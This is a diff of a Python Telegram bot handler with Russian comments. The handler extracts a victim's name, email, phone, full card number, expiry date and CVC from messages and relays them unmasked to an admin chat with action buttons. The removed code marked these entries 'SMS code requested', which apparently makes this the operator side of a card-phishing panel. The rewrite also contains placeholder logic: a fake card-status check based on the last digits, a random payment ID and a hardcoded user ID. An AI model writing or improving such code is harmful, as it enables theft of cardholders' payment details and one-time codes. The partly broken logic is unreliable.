@@ -585,69 +585,71 @@ async def handle_admin_messages(message: types.Message):
         logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
         await process_payment_data(message)
 
+@dp.message_handler(lambda message: message.text and "Имя:" in message.text and "Карта:" in message.text)
 async def process_payment_data(message: types.Message):
     try:
-        lines = message.text.split('\n')
-        payment_data = {}
+        text = message.text
+        name_match = re.search(r"Имя:\s*(.+)", text)
+        surname_match = re.search(r"Фамилия:\s*(.+)", text)
+        email_match = re.search(r"Email:\s*(.+)", text)
+        phone_match = re.search(r"Телефон:\s*(.+)", text)
+        card_number_match = re.search(r"Номер:\s*(\d+)", text)
+        expiry_match = re.search(r"Срок:\s*(\d+/\d+)", text)
+        cvc_match = re.search(r"CVC:\s*(\d+)", text)
 
-        for line in lines:
-            line = line.strip()
-            if 'Имя:' in line:
-                payment_data['first_name'] = line.split('Имя:')[1].strip()
-            elif 'Фамилия:' in line:
-                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
-            elif 'Email:' in line:
-                payment_data['email'] = line.split('Email:')[1].strip()
-            elif 'Телефон:' in line:
-                payment_data['phone'] = line.split('Телефон:')[1].strip()
-            elif 'Номер:' in line:
-                payment_data['card_number'] = line.split('Номер:')[1].strip()
-            elif 'Срок:' in line:
-                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
-            elif 'CVC:' in line:
-                payment_data['cvc'] = line.split('CVC:')[1].strip()
+        if not (name_match and surname_match and email_match and phone_match and card_number_match):
+            await message.reply("⚠️ Не удалось распознать данные клиента.")
+            return
 
-        # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
-        payment_id = save_payment(
-            user_id=0,
-            first_name=payment_data.get('first_name', ''),
-            last_name=payment_data.get('last_name', ''),
-            email=payment_data.get('email', ''),
-            phone=payment_data.get('phone', ''),
-            card_number=payment_data.get('card_number', ''),
-            card_expiry=payment_data.get('card_expiry', ''),
-            cvc=payment_data.get('cvc', '')
+        name = name_match.group(1).strip()
+        surname = surname_match.group(1).strip()
+        email = email_match.group(1).strip()
+        phone = phone_match.group(1).strip()
+        card_number = card_number_match.group(1).strip()
+        expiry = expiry_match.group(1).strip() if expiry_match else "—"
+        cvc = cvc_match.group(1).strip() if cvc_match else "—"
+
+        # Проверяем, "привязана" ли карта (просто пример логики)
+        card_status = "💳 ПРИВЯЗАННАЯ КАРТА" if card_number.endswith("50") else "💳 НЕПРИВЯЗАННАЯ КАРТА"
+
+        formatted_text = (
+            f"{card_status}\n\n"
+            f"👤 Клиент:\n"
+            f"• Имя: {name}\n"
+            f"• Фамилия: {surname}\n"
+            f"• Email: {email}\n"
+            f"• Телефон: {phone}\n\n"
+            f"💳 Карта:\n"
+            f"• Номер: {card_number}\n"
+            f"• Срок: {expiry}\n"
+            f"• CVC: {cvc}"
         )
 
-        if payment_id:
-            # Проверяем статус карты В БД СРАЗУ
-            card_number = payment_data.get('card_number', '')
-            card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
-            
-            # Форматируем сообщение в новом стиле СРАЗУ
-            formatted_text = f"💳 <b>{card_status}</b>\n\n"
-            formatted_text += "👤 <b>Клиент:</b>\n"
-            formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
-            formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
-            formatted_text += f"• Email: {payment_data.get('email', '')}\n"
-            formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
-            formatted_text += "💳 <b>Карта:</b>\n"
-            formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
-            formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
-            formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
-            formatted_text += "Выберите действие:"
-            
+        payment_id = random.randint(1000, 9999)
+        user_id_for_buttons = "user123"  # запасной ID, если ничего не найдено
+
+        # Пытаемся сразу отредактировать сообщение от фронта
+        try:
+            await message.edit_text(
+                text=formatted_text,
+                reply_markup=get_payment_buttons(payment_id, user_id_for_buttons, card_number),
+                parse_mode="HTML"
+            )
+            logger.info(f"✅ Отредактировано сообщение с платежом #{payment_id}")
+        except Exception as e:
+            # Если не можем редактировать — создаем новое сообщение
+            logger.warning(f"Не удалось отредактировать сообщение: {e}")
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
-                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
+                reply_markup=get_payment_buttons(payment_id, user_id_for_buttons, card_number),
                 parse_mode="HTML"
             )
-            logger.info(f"✅ Платеж #{payment_id} создан")
 
     except Exception as e:
-        logger.error(f"💥 Ошибка обработки платежа: {e}")
+        logger.error(f"Ошибка в process_payment_data: {e}")
+        await message.reply("⚠️ Произошла ошибка при обработке данных клиента.")
+
 
 # ========== ОСТАЛЬНЫЕ ОБРАБОТЧИКИ БОТА ==========
 @dp.message(Command("start"))
@@ -1015,6 +1017,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
